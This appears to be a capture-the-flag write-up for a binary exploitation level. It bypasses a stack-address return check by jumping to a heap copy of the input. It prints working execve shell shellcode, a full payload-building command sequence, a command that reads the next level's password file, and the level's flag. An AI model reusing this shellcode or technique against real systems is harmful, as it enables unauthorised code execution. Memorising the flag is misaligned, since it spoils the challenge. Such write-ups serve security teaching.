# Level 2

**Vulnerability:** Stack overflow via `gets()` + anti-stack-return check → shellcode on the heap.

## Walkthrough

`p()` reads into a 76-byte buffer (`ebp-0x4c`) with `gets()`. The saved EIP sits at
**offset 80** (76 + 4). Before returning, it rejects any return address matching the
stack mask `0xb0000000`, so we cannot jump back into the stack.

But just before returning, `p()` calls `strdup(buf)`, copying our input onto the
**heap** — which is not covered by the mask check. We place our shellcode there and
return into it.

Breaking right after `strdup` shows the heap copy lands at `eax = 0x0804a008`.

## Exploit

Payload = `[25B shellcode] + [55B NOP sled] + [heap addr 0x0804a008]` (80 bytes + EIP):

```sh
printf '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80' > /tmp/p
printf '\x90%.0s' $(seq 55) >> /tmp/p
printf '\x08\xa0\x04\x08\n' >> /tmp/p
cat /tmp/p - | ./level2
cat /home/user/level3/.pass
```

**Flag:** `492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02`
